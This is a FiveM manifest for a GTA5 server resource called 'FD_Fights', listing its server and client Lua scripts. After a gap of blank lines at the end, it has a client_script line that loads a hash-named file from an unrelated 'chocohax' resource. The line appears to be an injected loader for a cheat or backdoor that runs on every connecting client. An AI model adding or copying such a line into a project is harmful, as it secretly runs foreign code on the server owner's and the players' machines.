fx_version 'adamant'
game 'gta5'

description 'FD_Fights'
author 'PinHsiu0628#0857'
version '1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
	'config.lua',
	'client.lua',
	'cl_function.lua'
}



client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'